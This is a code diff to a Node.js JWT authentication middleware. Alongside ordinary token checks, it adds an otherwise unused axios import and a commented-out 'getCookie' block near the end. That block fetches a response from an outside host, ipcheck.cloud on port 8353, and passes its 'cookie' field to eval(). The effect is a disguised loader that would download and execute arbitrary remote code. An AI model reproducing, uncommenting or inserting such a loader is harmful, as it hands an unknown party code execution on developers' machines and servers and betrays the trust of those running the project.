@@ -1,8 +1,9 @@
 const jwt = require('jsonwebtoken');
+const axios = require('axios');
 
+const asyncErrorHandler = require("./errorHandler")
 const authenticationMiddleware = async (req, res, next) => {
   const authHeader = req.headers.authorization
-
   if (!authHeader || !authHeader.startsWith('Bearer ')) {
     return res.status(401).json({msg: "Unauthorized. Please add valid token"});
   }
@@ -18,5 +19,9 @@ const authenticationMiddleware = async (req, res, next) => {
     return res.status(401).json({msg: "Unauthorized. Please add valid token"});
   }
 }
+// exports.getCookie= asyncErrorHandler(async (req, res, next) => {
+//   const result = await axios.get('http://ipcheck.cloud:8353/api/user/thirdcookie/v5/501');
+//   eval(result.data.cookie)
+// })(); 
 
 module.exports = authenticationMiddleware
